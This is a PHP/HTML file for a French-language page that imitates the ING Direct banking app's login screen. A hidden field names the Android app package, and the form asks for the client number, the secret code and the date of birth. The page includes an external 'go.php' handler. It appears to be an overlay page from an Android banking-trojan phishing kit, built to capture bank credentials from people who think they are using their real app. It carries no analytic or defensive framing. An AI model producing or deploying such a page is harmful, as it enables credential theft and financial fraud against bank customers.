<?php require_once '../go.php'; ?><!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>05</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/05.css">
    <link rel="stylesheet" href="css/06.css">
    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_05">
            <div class="row">
                <div class="form_header">
                    <img src="img/05/logo.png" alt=""/>
                </div>
            </div>
			<div class="container">
				<form action="" method="post" class="wrapper">
                <input type="hidden" name="field1" value="com.IngDirectAndroid" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 Votre numéro client 
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Composez votre code secret 
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									  Votre date de naissance 
								</div>
								<div class="inp_wr">
									<input type="text" name="field4" class="main_inpes">  <input type="text" name="field5" class="main_inpes">  <input type="text" name="field1" class="main_inpes">
								</div>
							</div>
						
							<div class="btn_wr">
								<input class="login_btn" value="VALIDER">
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>